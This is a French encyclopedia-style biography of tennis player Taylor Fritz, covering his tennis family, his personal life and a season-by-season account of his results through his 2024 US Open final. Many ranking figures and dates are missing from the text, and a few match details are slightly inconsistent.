Il a remporté dix titres ATP en simple dont le Masters 1000 d'Indian Wells 2022 en battant en finale Rafael Nadal, alors classé quatrième joueur mondial.
Biographie.
Famille.
Taylor Fritz est le fils de l'ancienne joueuse de tennis Kathy May ( mondiale en 1977), qui a remporté un titre en simple au cours de sa carrière et atteint les quarts de finale d'un tournoi du Grand Chelem à trois reprises (Roland-Garros en 1977 et 1978 et l'US Open en 1978).
Son père, Guy Fritz, est également un ancien joueur de tennis du circuit secondaire ( en 1979), qui compte quelques participations dans des tournois du Grand Chelem en double. Il s'est reconverti ensuite avec succès dans le coaching.
Il est également le neveu de Harry Fritz ( en 1978), membre de l'équipe canadienne de Coupe Davis, qui a atteint la finale du tournoi de Lagos en 1980 et gagné le match le plus long en termes de jeux disputés depuis le début de l'ère Open (record battu par le match Isner - Mahut en 2010).
Vie personnelle.
En 2016, à seulement 18 ans, Taylor Fritz épouse sa petite amie de longue date Raquel Pedraza, joueuse de tennis sur le circuit ITF. Un an plus tard, en 2017, il devient père pour la première fois. En décembre 2019, le couple divorce après près de quatre ans de mariage.
Depuis juin 2020, il est en couple avec l'influenceuse Morgan Riddle, qui le suit sur les tournois.
Carrière.
2015. Premiers pas sur le circuit professionnel.
Après avoir joué son premier tournoi ATP à l'occasion de l'Open de Nottingham en , et y avoir atteint le deuxième tour au bénéfice de sa victoire sur Pablo Carreño-Busta, Taylor Fritz remporte le tournoi junior de l'US Open en tant que junior. En battant en finale son compatriote Tommy Paul (6-2, 6-7, 6-2), il prend ainsi sa revanche sur celui qui l'avait battu en finale de l'épreuve junior de Roland-Garros la même année.
En octobre, il remporte son premier tournoi Challenger à Sacramento en battant notamment au second tour Dustin Brown (6-7, 7-6, 7-6), mondial, puis Jared Donaldson en finale (6-4, 3-6, 6-4). La semaine suivante, il remporte le tournoi Challenger de Fairfield sans perdre un set, en battant en finale à nouveau Dustin Brown (6-3, 6-4) et intègre le top 250 du classement ATP. Il atteint encore la finale à Champaign où il s'incline contre Henri Laaksonen, ce qui lui permet de finir l'année à la alors qu'il l'avait commencée à la 1149.
2016. Première finale ATP.
Taylor Fritz commence la saison 2016 en remportant le tournoi Challenger de Happy Valley contre Dudi Sela (7-6, 6-2). Puis il se qualifie pour la première fois dans le tableau principal d'un tournoi du Grand Chelem à l'Open d'Australie, où il est battu au premier tour en cinq sets (4-6, 6-3, 6-0, 3-6, 4-6) par le mondial Jack Sock en 2 h 26.
En février, il participe au tournoi de Memphis et bat successivement le mondial Steve Johnson en deux manches, au second tour, puis l'Allemand Benjamin Becker et le Lituanien Ričardas Berankis. À 18 ans, il devient le plus jeune Américain à jouer la finale d'un tournoi ATP depuis Michael Chang en 1989, et bat le record de précocité qui était co-détenu par Connors et Roddick () en atteignant une finale à sa sur le circuit ATP. Il chute en finale face au mondial et tête de série 1 Kei Nishikori, sur le score de (4-6, 4-6) en 1 h 20 de jeu. Cette belle performance lui permet de monter à la mondiale. Après avoir chuté au premier tour à Delray Beach face à son compatriote Tim Smyczek, il se qualifie pour le tableau principal du tournoi d'Acapulco. Il y réalise une belle performance en battant notamment Jérémy Chardy, tête de série et mondial, au premier tour en 3 manches, avant de chuter en quarts de finale face à Sam Querrey. Ce résultat lui permet de progresser encore au classement mondial puisqu'il entre pour la première fois de sa carrière dans le top 100, à la .
Sur le gazon de Stuttgart, il bat le qualifié Fabrice Martin, avant de tenir tête à la tête de série 1 Roger Federer, (4-6, 7-5, 4-6) mais perd finalement.
À l'US Open, il perd à nouveau au premier tour contre Jack Sock en cinq manches (6-7, 5-7, 6-3, 6-1, 4-6).
2017. Première victoire sur un top 10 mondial.
En 2017, Taylor Fritz fait parler de lui lors du Masters 1000 de la saison à Indian Wells en battant le Croate Marin Čilić, tête de série 6 et mondial, remportant le match au tour en 3 manches (4-6, 7-5, 6-4). C'est sa première victoire face à un joueur du top 10 mondial, alors qu'il est mondial. Il est ensuite opposé au Tunisien Malek Jaziri au tour, contre qui il perd en 3 sets (4-6, 6-3, 3-6).
2019. Premier titre ATP.
Classé mondial quand il se présente à Roland-Garros, Taylor Fritz bat l'Australien mondial Bernard Tomic au premier tour en trois sets (6-1, 6-4, 6-1), mais est éliminé au deuxième tour par l'Espagnol mondial Roberto Bautista-Agut, tête de série , en trois sets (2-6, 3-6, 2-6).
Le , au tournoi sur gazon d'Eastbourne, il bat en finale Sam Querrey (6-3, 6-4) et remporte ainsi son premier titre ATP.
2020..
En février, lors du tournoi de tennis du Mexique à Acapulco, Taylor Fritz se hisse en finale après s'être défait de John Isner en demies (2-6, 7-5, 6-3). En finale, il retrouve Rafael Nadal contre qui il s'incline (6-3, 6-2).
2021. Première demi-finale en Masters 1000 et intégration du top 25 ATP.
Fritz commence l'année par un huitième de finale à Melbourne 2, perdu contre Jérémy Chardy (2-6, 4-6). Il perd pour la troisième année de suite au troisième tour de l'Open d'Australie, ayant éliminé au préalable Albert Ramos-Viñolas ainsi que son compatriote Reilly Opelka en cinq sets (4-6, 7-6, 6-7, 7-6, 6-2). Il est éliminé par le numéro un mondial et champion en titre Novak Djokovic, après une belle résistance (6-7, 4-6, 6-3, 6-4, 2-6).
Il enchaîne avec des demi-finales à Doha, battant sur son passage David Goffin et Denis Shapovalov, puis des huitièmes de finale à Doha et Miami. Il occupe pour la première fois de sa carrière après ce tournoi la place de numéro 1 américain.
La tournée sur terre battue est plus délicate malgré une place dans le dernier carré de Cagliari, battu par le local Lorenzo Sonego (4-6, 7-5, 1-6). Il est défait d'entrée à Monte-Carlo et Madrid par Roberto Bautista-Agut (pour la cinquième fois en six duels) et Albert Ramos-Viñolas , ainsi qu'au deuxième tour de Rome, éliminé comme à l'Open d'Australie par Novak Djokovic et Roland-Garros, au cours duquel il sort du court en chaise roulante à la suite d'une blessure au genou.
Fin juin, il joue l'unique tournoi sur gazon de sa saison, le Grand Chelem de Wimbledon. Il y atteint son meilleur résultat en battant deux de ses compatriotes, Brandon Nakashima ainsi que Steve Johnson en cinq sets (6-4, 7-6, 4-6, 6-7, 6-4). Il est battu en quatre sets par le numéro six mondial Alexander Zverev (7-6, 4-6, 3-6, 6-7), après avoir mené une manche à zéro.
Il s'envole début septembre pour la tournée américaine et aligne deux demi-finales à Los Cabos et Atlanta, il élimine à chaque fois Steve Johnson. Il s'ensuit une période de creux avec deux victoires en deux mois, éliminé au premier tour de Washington, Toronto et Cincinnati et au deuxième tour de l'US Open et San Diego.
Il dispute début octobre Indian Wells au cours duquel il se défait de Brandon Nakashima, son compatriote, puis de Matteo Berrettini, son premier top 10 depuis deux ans (6-4, 6-3), d'un autre Italien, Jannik Sinner sur le même score, puis de l'Allemand Alexander Zverev, numéro quatre mondial en quarts de finale, en sauvant deux balles de match. Il est éliminé comme à Doha par le Géorgien Nikoloz Basilashvili en demi-finale en deux manches (6-7, 3-6). C'est la première fois de sa carrière qu'il élimine deux top 10 durant le même tournoi et sa première demi-finale dans un Masters 1000.
Il confirme son bon résultat en atteignant au cours du même mois la finale de Saint-Pétersbourg, ayant écarté de son chemin Emil Ruusuvuori, Tommy Paul, John Millman et Jan-Lennard Struff. Il s'incline en finale en trois sets contre le Croate Marin Čilić (6-7, 6-4, 4-6). Il dispute par la suite les quarts de finale au Masters de Bercy, éliminant Lorenzo Sonego, le numéro six mondial Andrey Rublev (7-5, 7-6) et Cameron Norrie, mais subit sa cinquième défaite de suite contre le numéro un Novak Djokovic.
Il boucle son année avec un huitième de finale à Stockholm et une 23ème place mondiale, confirmant sa place dans le Top 50.
2022. Vainqueur de son Masters 1000 à Indian Wells, quart de finale en Grand Chelem et demi-finale aux Masters.
Lors de l'ATP Cup, Taylor Fritz bat Félix Auger-Aliassime (6-7, 6-4, 6-4), s'incline contre Alexander Zverev (4-6, 4-6) et vient à bout de Cameron Norrie (7-6, 3-6, 6-1). À l'Open d'Australie, il passe le qualifié Maximilian Marterer, puis son ami Frances Tiafoe et la tête de série 15 Roberto Bautista-Agut (6-0, 3-6, 3-6, 6-4, 6-3). Il s'incline (6-4, 4-6, 6-4, 3-6, 4-6) en 3 h 23, après avoir mené contre la tête de série 4, Stéfanos Tsitsipás.
Au mois de , Fritz participe au Masters 1000 d'Indian Wells. Exempté de premier tour, il bat Kamil Majchrzak puis passe difficilement (6-4, 2-6, 7-6) le qualifié Jaume Munar. Il livre un autre combat acharné face à l'Australien Alex de Minaur, qu'il remporte (3-6, 6-4, 7-6) pour arriver en quarts de finale. Il vient à bout d'un très bon Miomir Kecmanović (7-6, 3-6, 6-1) en 1 h 57 pour atteindre le dernier carré. Après 1 h 50 de jeu, Taylor Fritz se qualifie pour sa première finale de Masters 1000 à la suite de sa victoire (7-5, 6-4) face à Andrey Rublev. Opposé au mondial Rafael Nadal, invaincu 20 matchs de suite depuis le début de la saison 2022 où il a gagné trois tournois coup sur coup, dont l'Open d'Australie, Fritz est dans le doute avant la rencontre après avoir ressenti des douleurs à la cheville droite lors son opposition face à Rublev. La douleur s'aggrave à l'entraînement quelques heures avant la finale, mais il décide de la jouer, malgré le désaccord des membres de son entourage. Strappé, il se montre pourtant d'emblée supérieur à son adversaire, également diminué physiquement et qui aura recours à un temps mort médical. Il gagne le premier set 6-3. Nadal retrouve ses sensations lors du second set et parvient jusqu'au tie-break. Fritz se montre le plus consistant lors de ce dernier jeu décisif qu'il remporte 7-5 pour s'imposer (6-3, 7-6) en un peu plus de deux heures de jeu, il devient le premier Américain vainqueur d'Indian Wells depuis Andre Agassi en 2001. Ému par son succès, il révèle avoir ressenti de la douleur tout le match : . Cette victoire lui permet de se rapprocher du top 10, avec une place mondiale au classement ATP à l'issue du tournoi. Fritz enchaîne avec le Masters 1000 de Miami, où il s'incline (6-3, 1-6, 4-6) contre Miomir Kecmanović en huitièmes de finale.
Sur terre battue européenne, au Masters de Monte-Carlo, Fritz n'est pas non loin de la sortie dès son premier tour face au local Lucas Catarina mais il est finalement victorieux (6-7, 7-6, 6-4). Puis il perd un set contre Marin Čilić et passe son compatriote Sebastian Korda, tombeur d'Alcaraz au tour précédent, qu'il vainc (7-6, 7-5) pour arriver en quarts de finale. Il s'incline (6-2, 4-6, 3-6) contre Alejandro Davidovich Fokina qui ira jusqu'en finale.
Au tournoi de Roland Garros, il s'impose difficilement au premier tour contre l'Argentin Santiago Rodriguez Taverna en cinq sets, et est éliminé au tour suivant par l'Espagnol Bernabé Zapata Miralles (6-3, 2-6, 2-6, 3-6), issu des qualifications.
Il commence le mois de juin en disputant le 's-Hertogenbosh sur gazon. Il s'incline au premier tour en trois sets contre le Néerlandais Tim Van Rijthoven, 205ème mondial et futur vainqueur surprise du tournoi. Il est éliminé la semaine suivante, également au premier tour du tournoi du Queen's contre l'invité Jack Draper (3-6, 2-6).
Juste avant le Grand Chelem anglais, il se rassure sur son niveau de jeu et s'impose à Eastbourne contre son compatriote Maxime Cressy, (6-2, 6-7, 7-6). Il s'agit de son deuxième titre sur ce tournoi après celui de 2019.
À Wimbledon, pour son premier quart de finale dans un tournoi du Grand Chelem, Fritz perd aucune manche avec des victoires sur Lorenzo Musetti, Alastair Gray, Alex Molčan et le qualifié Australien Jason Kubler. Puis dans une rencontre de 4 h 21 de jeu, Taylor Fritz passe tous prêt de la victoire face à un Rafael Nadal diminué mais par s'incliné dans une terrible défaite (6-3, 5-7, 6-3, 5-7, 6-7).
Il atteint ensuite durant le mois d'août le troisième tour aux tournois de Washington (abandon contre Daniel Evans) et le Masters du Canada à Montréal (contre le Britannique de nouveau). Il bat durant le Masters 1000 de Cincinnati l'Argentin Sebastián Báez, puis l'Australien en forme Nick Kyrgios. Il vainc au troisième tour le Russe Andrey Rublev, joueur mondial, pour la deuxième fois de la saison (6-7, 6-2, 7-5), puis est battu par le numéro un mondial, Daniil Medvedev en quarts de finale (6-7, 3-6). C'est alors son meilleur parcours à Cincinnati.
Il dispute l'US Open et est battu dès le premier tour par l'Américain Brandon Holt, joueur mondial en quatre sets (7-6, 6-7, 3-6, 4-6) serrés.
Il perd mi-septembre deux rencontres en Coupe Davis contre le Néerlandais Botic van de Zandschulp et le Britannique Cameron Norrie et remporte un match contre le Kazakh Alexander Bublik. Il prend sa revanche à la Laver Cup contre le Britannique pour aider la Team Monde à emporter le trophée pour la première fois.
Il s'envole début octobre pour Tokyo et y remporte des victoires contre James Duckworth (6-2, 6-7, 6-1), le local Hiroki Moriya (6-1, 3-6, 6-4), puis accède aux demi-finales à la faveur du forfait de Nick Kyrgios. Il emporte sa demi-finale contre le Canadien Denis Shapovalov (6-3, 6-7, 6-3) puis dispose de son compatriote Frances Tiafoe pour la cinquième fois en six confrontations (7-6, 7-6) pour gagner le quatrième titre ATP de sa carrière, son troisième de l'année. Grâce à ce titre, cela ouvre la voie du top 10 pour Taylor avec une place mondiale.
À l'ATP 500 de Vienne, fin octobre en indoor, il bat au premier tour Yoshihito Nishioka en 3 sets (6-7, 7-6, 6-3). Il s'incline au deuxième tour contre le Canadien Denis Shapovalov (1-6, 6-4, 3-6). Il participe la semaine suivante au Masters 1000 de Paris-Bercy. Il affronte au premier tour l'Espagnol Alejandro Davidovich Fokina, qu'il bat en 2 sets (7-5, 6-2). Il perd au tour suivant contre Gilles Simon (5-7, 7-5, 4-6), qui joue à Paris le dernier tournoi de sa carrière, pour lequel il a obtenu une wild-card.
Classé à l'ATP à l'issue du tournoi de Paris-Bercy, il n'est théoriquement pas qualifié pour les ATP Finals, qui réunissent du 13 au 20 novembre les huit meilleurs joueurs mondiaux à Turin. Il bénéficie toutefois du forfait du mondial, Carlos Alcaraz, et est placé dans le même groupe de poule que Rafael Nadal, Casper Ruud et Félix Auger-Aliassime.
Il commence le tournoi par une victoire en deux sets contre Rafael Nadal (7-6, 6-1) en 1 h 37, avant de s'incliner deux jours plus tard contre Casper Ruud (6-3, 4-6, 6-7) en 2 h 11. Sa victoire contre Félix Auger-Aliassime (7-6, 6-7, 6-2) pour son dernier match de poule lui permet de rallier les demi-finales. Il s'incline alors en deux sets contre Novak Djokovic (6-7, 6-7) en 1 h 54, futur vainqueur du tournoi, contre qui il n'a remporté aucune de leurs six confrontations.
2023 : et titre ATP, meilleur classement en carrière, 1/2 finale à Monte-Carlo et 1/4 à l'US Open.
Taylor Fritz commence sa saison par la première édition de la United Cup. En poule, il bat Jiří Lehečka et Alexander Zverev sur le retour mais perd en trois sets sur Cameron Norrie. En demi-finale, il bat le Hubert Hurkacz en deux tie-breaks et en finale l'Italien Matteo Berrettini également en deux tie-breaks. Les États-Unis remportent cette édition avec ses compatriotes Frances Tiafoe, Madison Keys et Jessica Pegula.
Fritz poursuit avec le premier tournoi du Grand Chelem, l'Open d'Australie dont il est tête de série numéro huit. Après avoir écarté le Géorgien Nikoloz Basilashvili en quatre sets (6-4, 6-2, 4-6, 7-5), il s'incline au second tour contre le local Alexei Popyrin en cinq sets serrés (7-6, 6-7, 4-6, 7-6, 2-6). C'est son pire résultat dans le Grand Chelem australien depuis six ans.
Il dispute mi-février dans son pays natal le tournoi de Dallas et écarte deux de ses compatriotes, l'invité Jack Sock (7-6, 6-4) et Marcos Giron (7-6, 3-6, 6-3) puis est sorti en demi-finale au terme d'un match serré par le Chinois Wu Yibing (7-6, 5-7, 4-6) qui devient le premier Chinois à disputer la finale d'un tournoi ATP.
Mi-février, toujours aux États-Unis, il dispute et remporte le tournoi de Delray Beach, son cinquième titre ATP en carrière. Il bat pour cela l'Équatorien Emilio Gómez (6-4, 6-3), le Français Adrian Mannarino (7-6, 6-4), son compatriote Mackenzie McDonald (6-3, 7-6) et le Serbe Miomir Kecmanović (6-0, 5-7, 6-2). Grâce à ce titre, il obtient son meilleur classement en carrière avec cette place mondiale.
Une semaine plus tard à Acapulco, il se défait de ses compatriotes John Isner (3-6, 6-3, 6-4) et Frances Tiafoe (6-3, 6-4) ainsi que du Canadien Denis Shapovalov (6-4, 6-4) pour s'incliner en demi-finale contre un autre Américain Tommy Paul (3-6, 7-6, 6-7).
Tenant du titre au Masters d'Indian Wells, il élimine son compatriote Ben Shelton (4-6, 6-4, 6-3), l'Argentin Sebastián Báez (6-1, 6-2) et le Hongrois Márton Fucsovics (6-4, 6-3) pour rallier les quarts de finale. Il est déchu de son titre par l'Italien Jannik Sinner (4-6, 6-4, 4-6) après 2 heure et 17 minutes. Il atteint le même stade dans l'autre Masters 1000 californien, à Miami, ce qui constitue sa meilleure performance jusqu'alors. Il bat l'invité Emilio Nava (6-4, 6-1), le Canadien Denis Shapovalov (6-4, 6-4) et le huitième mondial Holger Rune (6-3, 6-4). Il est écarté par le numéro un mondial, Carlos Alcaraz (4-6, 2-6) en 1 h 18 de jeu.
Lors de son premier tournoi sur terre battue de la saison au Masters de Monte-Carlo, Taylor Fritz affronte et élimine l'ancien champion invité, Stanislas Wawrinka (7-6, 6-2), le jeune Tchèque Jiří Lehečka (4-6, 6-4, 6-1) et la tête de série numéro deux et double tenant du titre Stéfanos Tsitsipás (6-2, 6-4) pour rejoindre les demi-finale, son meilleur résultat dans un tournoi de ce niveau sur terre battue. Il se fait néanmoins renverser à ce stade par le Russe Andrey Rublev (7-5, 1-6, 3-6), sixième joueur mondial. La semaine suivante, il joue à Munich et renverse le Hongrois Márton Fucsovics dans leur deuxième duel de l'année (4-6, 6-3, 6-3), bat l'ancien numéro trois Dominic Thiem (6-3, 6-4) mais échoue à rallier la finale en perdant contre le finaliste de l'année passée, le Néerlandais Botic van de Zandschulp (4-6, 6-7).
Quelques jours plus tard, il atteint pour la première fois de sa carrière les huitièmes de finale au Masters de Madrid en disposant de l'Australien Christopher O'Connell (7-6, 6-4) et du Chilien Cristian Garín (6-1, 7-6) mais s'incline contre le surprenant Zhang Zhizhen, mondial (6-3, 6-7, 6-7), après avoir obtenu trois balles de match. Il se présente au Masters de Rome mais ne parvient pas à faire mieux qu'un deuxième tour, perdu contre le qualifié allemand Yannick Hanfmann (4-6, 1-6). Il rebondit à Genève fin mai où en tant que tête de série numéro deux, il élimine pour la deuxième fois de l'année son compatriote Marcos Giron (4-6, 6-2, 6-3) et le Biélorusse Ilya Ivashka (6-1, 6-2). Il sort néanmoins en demi-finale contre le Bulgare Grigor Dimitrov (6-3, 5-7, 6-7) au terme d'un match serré.
Début juin, il rejoint le troisième tour de Roland-Garros pour la seconde fois de sa carrière. Il bat pour cela son compatriote Michael Mmoh (6-2, 6-1, 6-1) et élimine le dernier Français en lice Arthur Rinderknech (2-6, 6-4, 6-3, 6-4) dans une ambiance électrique. Il échoue à disputer la deuxième semaine en s'inclinant contre le terrien Francisco Cerúndolo (6-3, 3-6, 4-6, 5-7).
Pour le début de la tournée sur gazon, il gagne un match contre le Russe Aslan Karatsev (7-6, 6-3) au tournoi de Stuttgart en tant que tête de série numéro deux, puis s'incline en quarts de finale contre le Hongrois Márton Fucsovics (4-6, 5-7). Au Queen's, il bat Bernabé Zapata Miralles puis est défait par le Français Adrian Mannarino (4-6, 6-7). Il joue également en double avec Jiří Lehečka et atteint la finale. Juste avant Wimbledon, il ne rassure pas sur son niveau de jeu en perdant au premier tour d'Eastbourne, tournoi dont il est tenant du titre contre son compatriote Mackenzie McDonald en deux tie-breaks. Lors du tournoi londonien, il bat d'abord difficilement l'Allemand Yannick Hanfmann (6-4, 2-6, 4-6, 7-5, 6-3) mais s'incline dès le deuxième tour de nouveau en cinq sets contre le Suédois Mikael Ymer, alors qu'il menait deux sets à zéro et un break dans le troisième set (6-3, 6-2, 3-6, 4-6, 2-6).Fin juillet, Fritz rebondit au tournoi d'Atlanta à nouveau aux États-Unis. Il bat le Chinois Wu Yibing qui l'avait battu à Dallas, puis le revenant Kei Nishikori qui rejoue bien et son compatriote, Jeffrey John Wolf pour atteindre la finale. Taylor remporte son en carrière, le second cette année, contre la surprise australienne Aleksandar Vukic (7-5, 6-7, 6-4). Il part en capitale américaine, à Washington où il bat le qualifié Zachary Svajda (6-3, 6-3), l'ancien champion britannique Andy Murray (6-7, 6-3, 6-4) ainsi que l'Australien Jordan Thompson auteur d'une bonne tournée sur gazon (6-3, 6-3). Il rencontre le Néerlandais Tallon Griekspoor en demi-finale et malgré le gain du premier set, s'incline (6-3, 3-6, 2-6).
Comme l'année précédente, il s'incline ensuite en huitièmes de finale du Masters du Canada contre un joueur en forme, Alex de Minaur (6-7, 6-4, 1-6), finaliste à Los Cabos quelques jours plus tôt, futur finaliste surprise et après avoir battu le Français Ugo Humbert (7-6, 3-6, 6-3). Comme l'année précédente, il rejoint les quarts de finale à Cincinnati, éliminant le jeune Tchèque Jiří Lehečka (7-6, 6-2), l'Italien Lorenzo Sonego (6-4, 7-6) et profitant de l'abandon du Serbe Dušan Lajović, (5-0 ab.), tombeur de Jannik Sinner. Il joue le numéro deux Novak Djokovic qu'il n'a jamais battu et s'arrête à ce stade contre le Serbe (0-6, 4-6), qui sera vainqueur du tournoi.
Arrivé à l'US Open fin août, il fait forte impression lors de ses premiers tours, se débarrassant facilement de Steve Johnson, invité (6-2, 6-1, 6-2), du Péruvien Juan Pablo Varillas (6-1, 6-2, 6-2) et du jeune qualifié tchèque Jakub Menšík (6-1, 6-2, 6-0) et parvient ainsi facilement en huitièmes de finale du Grand Chelem de son pays natal pour la première fois. Il profite d'un tableau ouvert et sort à ce stade le jeune Dominic Stricker, qualifié et mondial (7-6, 6-4, 6-4) pour s'offrir un quart de finale et une revanche contre Novak Djokovic. Pour la huitième fois en autant de rencontres, il s'incline face au joueur serbe en trois sets (1-6, 4-6, 4-6) qui, comme à Cincinnati, sera vainqueur du tournoi, empochant son troisième Grand Chelem de l'année.
Il atteint début octobre pour la première fois de sa carrière le troisième tour à Shanghai en remportant difficilement un match contre Yosuke Watanuki (7-6, 6-7, 6-4) puis s'incline contre l'invité Diego Schwartzman, ancien membre du top 10 (4-6, 6-3, 6-7). Tenant du titre à Tokyo, il sort le Britannique Cameron Norrie (6-4, 6-3) puis est renversé de manière surprenante par l'invité local Shintaro Mochizuki, joueur mondial (6-0, 4-6, 6-7). À Bâle, pour la troisième fois de suite, il gagne un match au premier tour contre Max Purcell en deux tie-breaks puis sort au tour suivant, battu par le qualifié Alexander Shevchenko, en trois tie-breaks (7-6, 6-7, 6-7). Il déclare forfait fin octobre au deuxième tour du Masters 1000 de Paris, gêné par une blessure aux abdominaux, ce qui met fin à ses chances de participer au Masters de fin d'année.
2024. finale en Grand Chelem à l'US Open, 1/4 à l'Open d'Australie et Wimbledon, et titre à Delray Beach et Eastbourne.
Taylor Fritz commence l'année à l'United Cup où il bat Cameron Norrie et perd contre Alex de Minaur. Il commence ensuite l'Open d'Australie par une victoire difficile face à l'Argentin Facundo Díaz Acosta (4-6, 6-3, 3-6, 6-2, 6-4). Il ne concède au deuxième tour qu'un set contre le repêché français Hugo Gaston (6-0, 6-3, 6-1) puis gagne en quatre manches face au Hongrois Fábián Marozsán (3-6, 6-4, 6-2, 6-2). Opposé au Grec Stéfanos Tsitsipás, finaliste du tournoi l'année précédente, il s'impose (7-6, 5-7, 6-3, 6-3) et rejoint pour la première fois de sa carrière les quarts de finale à Melbourne. Il retrouve alors Novak Djokovic, numéro un mondial et vainqueur de trois des quatre derniers tournois du Grand Chelem. Il fait jeu égal avec son adversaire pendant deux sets puis se fait dominer les deux suivants pour subir une neuvième défaite en autant de confrontations face au Serbe (6-7, 6-4, 2-6, 3-6).
Il tient son rang en tant que tête de série numéro une et tenant du titre à Delray Beach en février, s'adjugeant un septième titre sans concéder la moindre manche face au Portugais Nuno Borges (7-6, 6-4), à l'Australien Rinky Hijikata (6-3, 6-3) et contre ses compatriotes Marcos Giron (7-6, 6-2) et Tommy Paul (6-2, 6-3), tous deux en finale du tournoi de Dallas quelques jours auparavant. Il égalise à cette occasion le record du nombre de titres du tournoi (deux fois) avec d'autres joueurs. Il perd la semaine suivante d'entrée à Acapulco contre l'Italien Matteo Arnaldi (4-6, 6-4, 3-6). Au Masters d'Indian Wells, il enchaîne deux nouvelles victoires contre les terriens Alejandro Tabilo (7-6, 6-2) et Sebastián Báez (6-2, 6-2), puis s'incline dès les huitièmes de finale contre le numéro sept mondial danois Holger Rune après avoir obtenu une balle de match (6-2, 6-7, 3-6). Cela constitue son plus mauvais résultat dans le tournoi californien depuis 2019. À Miami, il réalise une contre-performance en étant éliminé dès son premier match par le Brésilien Thiago Seyboth Wild (3-6, 4-6).
Sur terre battue, il débute par une défaite dès le premier tour au Masters 1000 de Monte-Carlo, son plus mauvais résultat dans cette catégorie de tournoi depuis près de trois ans, perdant son match contre l'Italien Lorenzo Musetti (4-6, 4-6) alors qu'il était demi-finaliste l'année précédente. Fin avril, il parvient en finale du tournoi de Munich, sa première sur terre battue, après des victoires contre le qualifié espagnol Alejandro Moro Cañas (6-3, 6-1), le Britannique Jack Draper qui est proche de le sortir (4-6, 6-3, 7-6) et le terrien Cristian Garín, tombeur du numéro cinq mondial Alexander Zverev au tour précédent (6-3, 6-4). Il affronte en finale le local Jan-Lennard Struff, qui s'offre son premier titre ATP à 33 ans (5-7, 3-6). Au Masters de Madrid, il enchaîne plusieurs victoires contre Luciano Darderi (7-6, 6-4), l'Argentin Sebastián Báez (6-2, 6-3) et le Polonais Hubert Hurkacz, neuvième mondial (7-6, 6-4) et améliore ainsi son meilleur résultat dans le tournoi madrilène en atteignant les quarts de finale. Il joue contre un autre Argentin et novice à ce niveau à Madrid, Francisco Cerúndolo qui a éliminé le cinquième mondial Alexander Zverev au tour précédent. Au terme d'un match décousu, il se qualifie pour les demi-finales (6-1, 3-6, 6-3), pour la quatrième fois en Masters 1000. Il affronte le Russe Andrey Rublev, vainqueur du double tenant du titre et numéro deux mondial Carlos Alcaraz en quarts, et est écarté en deux manches (4-6, 3-6).
Il franchit pour la première fois de sa carrière le deuxième tour à Rome en sortant le vétéran Fabio Fognini, invité par les organisateurs (6-3, 6-4) puis son compatriote Sebastian Korda sur le même score. Il bat en huitièmes de finale le Bulgare Grigor Dimitrov (6-2, 6-7, 6-1), dixième joueur mondial et est écarté en quarts par l'Allemand Alexander Zverev (4-6, 3-6), numéro cinq mondial et ancien vainqueur du tournoi. Il subit une deuxième défaite consécutive contre son jeune compatriote Alex Michelsen (4-6, 6-4, 5-7), au second tour de Genève. La semaine suivante à Roland-Garros, il parvient à battre l'Argentin Federico Coria (2-6, 6-1, 6-2, 6-1) et le Serbe Dušan Lajović (6-3, 3-6, 6-3, 6-4) et sort vainqueur d'une grosse bataille contre le surprenant Australien Thanasi Kokkinakis (6-3, 6-2, 6-7, 5-7, 6-3) pour rallier pour la première fois de sa carrière la deuxième semaine du tournoi parisien. Il est opposé au double finaliste du tournoi, le Norvégien Casper Ruud qui le sort (6-7, 6-3, 4-6, 2-6) logiquement.
Sur gazon, il enchaîne avec un quart de finale au Queen's, se débarrassant du qualifié Taro Daniel (6-3, 6-3) et de l'ancien finaliste de Wimbledon Milos Raonic (7-6, 6-4). Il est sorti par un spécialiste de la surface, l'Australien Jordan Thompson (4-6, 3-6). La semaine suivante, il devient le premier joueur à remporter trois fois le tournoi d'Eastbourne, remportant au passage son huitième titre en carrière contre le surprenant qualifié Max Purcell (6-4, 6-3). Lors des tours précédents, il avait éliminé le Brésilien Thiago Seyboth Wild (7-6, 6-3), le jeune Shang Juncheng et le repêché australien Aleksandar Vukic en deux tie-breaks. Il enchaîne de nouvelles victoires à Wimbledon contre l'Australien Christopher O'Connell (6-1, 6-2, 6-4), le Français Arthur Rinderknech (6-3, 6-4, 3-6, 6-4) qu'il retrouve après un duel tendu l'année passée à Roland Garros et une des révélations de la saison, le Chilien Alejandro Tabilo, vainqueur juste avant à Majorque (7-6, 6-3, 7-5). Il renverse en huitièmes de finale l'Allemand Alexander Zverev, peu à l'aise sur gazon mais numéro quatre mondial et récent finaliste à Roland Garros (4-6, 6-7, 6-4, 7-6, 6-3) pour jouer son quatrième quart de finale en Grand Chelem. Néanmoins, il ne franchit toujours pas ce stade en carrière, buttant contre le novice Lorenzo Musetti (6-3, 6-7, 2-6, 6-3, 1-6), qui accède alors à sa première demi-finale en Grand Chelem.
Il déçoit lors de son retour à la compétition, à l'Open du Canada, s'inclinant d'entrée en deux sets contre son compatriote titré à Washington quelques jours avant, Sebastian Korda (4-6, 6-7). Il se ressaisit à l'US Open, éliminant l'Argentin Camilo Ugo Carabelli (7-5, 6-1, 6-2), l'Italien Matteo Berrettini, ancien sixième mondial (6-3, 7-6, 6-1) et l'Argentin Francisco Comesaña (6-3, 6-4, 6-2). Il perd le premier set en huitièmes de finale contre le huitième au classement ATP Casper Ruud (3-6, 6-4, 6-3, 6-2) mais renverse la situation. Il affronte le numéro quatre mondial Alexander Zverev, ancien finaliste et le sort (7-6, 3-6, 6-4, 7-6), accédant ainsi à sa première demi-finale en Majeur, pour affronter son compatriote Frances Tiafoe. Au bout d'un gros duel en cinq manches, il parvient à se qualifier pour sa première finale de Grand Chelem (4-6, 7-5, 4-6, 6-4, 6-1). Il affronte l'Italien Jannik Sinner, numéro un mondial et vainqueur de l'Open d'Australie en début d'année et cède logiquement en trois manches (3-6, 4-6, 5-7). Grâce à ce résultat, il remonte à la place du classement ATP. Fritz aura connu des moments difficiles à la suite de cette défaite. Dans un mélange d'humour et de sincérité, il a révélé lors d'une entrevue sur le balado Nothing Major qu'il avait traversé des moments difficiles suivant sa défaite, jouant jusqu'à 12 heures par jour à des jeux vidéos tout en consommant de la nourriture nocive pour la santé.
